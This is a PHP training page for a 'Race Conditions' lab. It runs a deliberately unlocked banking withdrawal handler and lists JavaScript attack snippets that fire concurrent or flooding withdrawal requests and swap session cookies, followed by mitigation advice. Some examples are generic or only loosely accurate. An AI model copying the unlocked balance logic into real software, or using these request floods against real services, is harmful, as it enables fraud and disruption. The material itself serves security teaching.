<?php
// Lab 4: Race Conditions
// Vulnerability: Race condition vulnerabilities

session_start();

$message = '';
$balance = $_SESSION['balance'] ?? 1000.00;
$transactions = $_SESSION['transactions'] ?? [];
$transaction_id = 1;

// Simulate race condition processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'withdraw') {
        $amount = floatval($_POST['amount'] ?? 0);
        
        if ($amount > 0 && $amount <= $balance) {
            // Vulnerable: No proper locking mechanism
            $old_balance = $balance;
            $balance -= $amount;
            $_SESSION['balance'] = $balance;
            
            $transaction = [
                'id' => $transaction_id++,
                'type' => 'withdrawal',
                'amount' => $amount,
                'balance_before' => $old_balance,
                'balance_after' => $balance,
                'timestamp' => date('Y-m-d H:i:s')
            ];
            $transactions[] = $transaction;
            $_SESSION['transactions'] = $transactions;
            $_SESSION['transaction_id'] = $transaction_id;
            
            $message = '<div class="alert alert-success">✅ Withdrawal successful! New balance: $' . number_format($balance, 2) . '</div>';
        } else {
            $message = '<div class="alert alert-danger">❌ Invalid withdrawal amount or insufficient funds.</div>';
        }
    } elseif ($action === 'deposit') {
        $amount = floatval($_POST['amount'] ?? 0);
        
        if ($amount > 0) {
            $old_balance = $balance;
            $balance += $amount;
            $_SESSION['balance'] = $balance;
            
            $transaction = [
                'id' => $transaction_id++,
                'type' => 'deposit',
                'amount' => $amount,
                'balance_before' => $old_balance,
                'balance_after' => $balance,
                'timestamp' => date('Y-m-d H:i:s')
            ];
            $transactions[] = $transaction;
            $_SESSION['transactions'] = $transactions;
            $_SESSION['transaction_id'] = $transaction_id;
            
            $message = '<div class="alert alert-success">✅ Deposit successful! New balance: $' . number_format($balance, 2) . '</div>';
        } else {
            $message = '<div class="alert alert-danger">❌ Invalid deposit amount.</div>';
        }
    } elseif ($action === 'race_condition_test') {
        $test_type = $_POST['test_type'] ?? '';
        $test_data = $_POST['test_data'] ?? '';
        
        if (!empty($test_type) && !empty($test_data)) {
            $message = '<div class="alert alert-warning">⚠️ Race condition test detected: ' . htmlspecialchars($test_type) . ' - ' . htmlspecialchars($test_data) . '</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Race Conditions - Business Logic Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .race-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .balance-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
            text-align: center;
        }

        .balance-amount {
            font-size: 2rem;
            font-weight: bold;
            color: var(--accent-green);
        }

        .transactions-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .transaction-item {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border: 1px solid #334155;
        }

        .race-condition-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .transaction-type {
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-size: 0.8rem;
            font-weight: 600;
        }

        .type-withdrawal {
            background: var(--accent-red);
            color: #e2e8f0;
        }

        .type-deposit {
            background: var(--accent-green);
            color: #1a202c;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Business Logic Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Race Conditions</h1>
            <p class="hero-subtitle">Race condition vulnerabilities</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates race condition vulnerabilities where attackers can exploit timing-based vulnerabilities to gain unauthorized benefits, bypass controls, and manipulate business logic.</p>
            <p><strong>Objective:</strong> Understand how race condition attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-lightning me-2"></i>Vulnerable Banking System
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Account Operations</h5>
                            <p>This system allows account operations. Try to exploit race conditions:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="withdraw">
                                <div class="mb-3">
                                    <label for="withdraw_amount" class="form-label">Withdrawal Amount</label>
                                    <input type="number" class="form-control" id="withdraw_amount" name="amount" placeholder="100.00" step="0.01" min="0.01">
                                </div>
                                <button type="submit" class="btn btn-primary">Withdraw</button>
                            </form>
                            
                            <hr>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="deposit">
                                <div class="mb-3">
                                    <label for="deposit_amount" class="form-label">Deposit Amount</label>
                                    <input type="number" class="form-control" id="deposit_amount" name="amount" placeholder="100.00" step="0.01" min="0.01">
                                </div>
                                <button type="submit" class="btn btn-primary">Deposit</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-lightning me-2"></i>Race Condition Tester
                    </div>
                    <div class="card-body">
                        <div class="race-warning">
                            <h5>⚠️ Race Condition Warning</h5>
                            <p>This lab demonstrates race condition vulnerabilities:</p>
                            <ul>
                                <li><code>No Locking</code> - No proper locking mechanism</li>
                                <li><code>Timing Issues</code> - Timing-based vulnerabilities</li>
                                <li><code>Concurrent Access</code> - Multiple simultaneous requests</li>
                                <li><code>No Validation</code> - No proper validation</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Race Condition Techniques</h5>
                            <p>These techniques can be used for race conditions:</p>
                            <ul>
                                <li><code>Concurrent Requests</code> - Multiple simultaneous requests</li>
                                <li><code>Timing Attacks</code> - Exploit timing windows</li>
                                <li><code>State Manipulation</code> - Manipulate shared state</li>
                                <li><code>Resource Exhaustion</code> - Exhaust system resources</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testRaceCondition()" class="btn btn-primary">Test Race Condition</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-wallet2 me-2"></i>Account Balance
                    </div>
                    <div class="card-body">
                        <div class="balance-display">
                            <h5>Current Balance</h5>
                            <div class="balance-amount">$<?php echo number_format($balance, 2); ?></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if (!empty($transactions)): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-list-ul me-2"></i>Transaction History
                    </div>
                    <div class="card-body">
                        <div class="transactions-display">
                            <?php foreach (array_reverse($transactions) as $transaction): ?>
                            <div class="transaction-item">
                                <div class="row align-items-center">
                                    <div class="col-md-2">
                                        <strong>#<?php echo $transaction['id']; ?></strong>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="transaction-type type-<?php echo $transaction['type']; ?>"><?php echo ucfirst($transaction['type']); ?></span>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-success">$<?php echo number_format($transaction['amount'], 2); ?></span>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-muted">Before: $<?php echo number_format($transaction['balance_before'], 2); ?></span>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-info">After: $<?php echo number_format($transaction['balance_after'], 2); ?></span>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-muted"><?php echo $transaction['timestamp']; ?></span>
                                    </div>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Race Condition Techniques
                    </div>
                    <div class="card-body">
                        <div class="race-condition-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Concurrent Requests</div>
                                <div class="technique-demo">// Send multiple requests simultaneously
const promises = [];
for (let i = 0; i < 10; i++) {
    promises.push(
        fetch('/withdraw', {
            method: 'POST',
            body: 'amount=100'
        })
    );
}
Promise.all(promises);</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Timing Attacks</div>
                                <div class="technique-demo">// Exploit timing windows
setTimeout(() => {
    fetch('/withdraw', {method: 'POST', body: 'amount=100'});
}, 0);
setTimeout(() => {
    fetch('/withdraw', {method: 'POST', body: 'amount=100'});
}, 1);</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">State Manipulation</div>
                                <div class="technique-demo">// Manipulate shared state
const state = {balance: 1000};
// Multiple operations on same state
state.balance -= 100; // Request 1
state.balance -= 100; // Request 2
// Both see same initial state</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Resource Exhaustion</div>
                                <div class="technique-demo">// Exhaust system resources
for (let i = 0; i < 1000; i++) {
    fetch('/withdraw', {
        method: 'POST',
        body: 'amount=1'
    });
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Lock Bypass</div>
                                <div class="technique-demo">// Bypass locking mechanisms
// Use different endpoints
fetch('/admin/withdraw', {method: 'POST', body: 'amount=100'});
fetch('/internal/withdraw', {method: 'POST', body: 'amount=100'});
fetch('/bypass/withdraw', {method: 'POST', body: 'amount=100'});</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Session Manipulation</div>
                                <div class="technique-demo">// Manipulate session state
// Use different session IDs
fetch('/withdraw', {
    method: 'POST',
    headers: {'Cookie': 'session_id=1'},
    body: 'amount=100'
});
fetch('/withdraw', {
    method: 'POST',
    headers: {'Cookie': 'session_id=2'},
    body: 'amount=100'
});</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Race Condition</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> Concurrent requests</li>
                        <li><strong>Issue:</strong> No proper locking mechanism</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Concurrent Requests:</strong> Multiple simultaneous requests</li>
                        <li><strong>Timing Attacks:</strong> Exploit timing windows</li>
                        <li><strong>State Manipulation:</strong> Manipulate shared state</li>
                        <li><strong>Resource Exhaustion:</strong> Exhaust system resources</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Race Condition Examples</h5>
            <p>Use these techniques to exploit race condition vulnerabilities:</p>
            
            <h6>1. Basic Race Condition:</h6>
            <div class="code-block">// Send multiple requests simultaneously
const promises = [];
for (let i = 0; i < 10; i++) {
    promises.push(
        fetch('/withdraw', {
            method: 'POST',
            body: 'amount=100'
        })
    );
}
Promise.all(promises);</div>

            <h6>2. Timing Attack:</h6>
            <div class="code-block">// Exploit timing windows
setTimeout(() => {
    fetch('/withdraw', {method: 'POST', body: 'amount=100'});
}, 0);
setTimeout(() => {
    fetch('/withdraw', {method: 'POST', body: 'amount=100'});
}, 1);</div>

            <h6>3. State Manipulation:</h6>
            <div class="code-block">// Manipulate shared state
const state = {balance: 1000};
// Multiple operations on same state
state.balance -= 100; // Request 1
state.balance -= 100; // Request 2
// Both see same initial state</div>

            <h6>4. Resource Exhaustion:</h6>
            <div class="code-block">// Exhaust system resources
for (let i = 0; i < 1000; i++) {
    fetch('/withdraw', {
        method: 'POST',
        body: 'amount=1'
    });
}</div>

            <h6>5. Lock Bypass:</h6>
            <div class="code-block">// Bypass locking mechanisms
// Use different endpoints
fetch('/admin/withdraw', {method: 'POST', body: 'amount=100'});
fetch('/internal/withdraw', {method: 'POST', body: 'amount=100'});
fetch('/bypass/withdraw', {method: 'POST', body: 'amount=100'});</div>

            <h6>6. Session Manipulation:</h6>
            <div class="code-block">// Manipulate session state
// Use different session IDs
fetch('/withdraw', {
    method: 'POST',
    headers: {'Cookie': 'session_id=1'},
    body: 'amount=100'
});
fetch('/withdraw', {
    method: 'POST',
    headers: {'Cookie': 'session_id=2'},
    body: 'amount=100'
});</div>

            <h6>7. Database Race Condition:</h6>
            <div class="code-block">// Database race condition
// Multiple transactions on same record
BEGIN TRANSACTION;
SELECT balance FROM accounts WHERE id = 1;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
COMMIT;

// Another transaction at same time
BEGIN TRANSACTION;
SELECT balance FROM accounts WHERE id = 1;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
COMMIT;</div>

            <h6>8. File System Race Condition:</h6>
            <div class="code-block">// File system race condition
// Multiple processes accessing same file
if (file_exists('lock.txt')) {
    // Process 1 checks file
    // Process 2 checks file at same time
    // Both proceed without proper locking
}</div>

            <h6>9. Memory Race Condition:</h6>
            <div class="code-block">// Memory race condition
// Multiple threads accessing shared memory
int balance = 1000;
// Thread 1: balance -= 100;
// Thread 2: balance -= 100;
// Both read 1000, both write 900
// Result: 900 instead of 800</div>

            <h6>10. API Race Condition:</h6>
            <div class="code-block">// API race condition
// Multiple API calls to same endpoint
const apiCalls = [];
for (let i = 0; i < 100; i++) {
    apiCalls.push(
        fetch('/api/withdraw', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({amount: 100})
        })
    );
}
Promise.all(apiCalls);</div>

            <h6>11. WebSocket Race Condition:</h6>
            <div class="code-block">// WebSocket race condition
const ws1 = new WebSocket('ws://localhost:8080');
const ws2 = new WebSocket('ws://localhost:8080');

ws1.onopen = () => {
    ws1.send(JSON.stringify({action: 'withdraw', amount: 100}));
};
ws2.onopen = () => {
    ws2.send(JSON.stringify({action: 'withdraw', amount: 100}));
};</div>

            <h6>12. Cache Race Condition:</h6>
            <div class="code-block">// Cache race condition
// Multiple processes updating cache
const cache = new Map();
// Process 1: cache.set('balance', 900);
// Process 2: cache.set('balance', 900);
// Both read same value, both write same value</div>

            <h6>13. Queue Race Condition:</h6>
            <div class="code-block">// Queue race condition
// Multiple consumers processing same queue
const queue = [];
// Consumer 1: processes item
// Consumer 2: processes same item
// Both process same item</div>

            <h6>14. Distributed System Race Condition:</h6>
            <div class="code-block">// Distributed system race condition
// Multiple nodes updating same data
// Node 1: updates balance
// Node 2: updates balance at same time
// Both see same initial state</div>

            <h6>15. Microservice Race Condition:</h6>
            <div class="code-block">// Microservice race condition
// Multiple services updating same data
const service1 = 'http://service1:8080/withdraw';
const service2 = 'http://service2:8080/withdraw';

fetch(service1, {method: 'POST', body: 'amount=100'});
fetch(service2, {method: 'POST', body: 'amount=100'});</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Financial losses and revenue impact</li>
                <li>Data corruption and integrity issues</li>
                <li>Unauthorized access and privilege escalation</li>
                <li>Compliance violations and legal issues</li>
                <li>Business process disruption and operational impact</li>
                <li>System instability and performance issues</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper locking mechanisms</li>
                    <li>Use atomic operations and transactions</li>
                    <li>Implement proper concurrency control</li>
                    <li>Use secure coding practices</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual concurrency patterns</li>
                    <li>Implement proper input validation</li>
                    <li>Use secure session management</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about security threats</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use race condition detection tools</li>
                    <li>Implement proper audit trails</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testRaceCondition() {
            alert('Race Condition test initiated. Try the race condition techniques above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
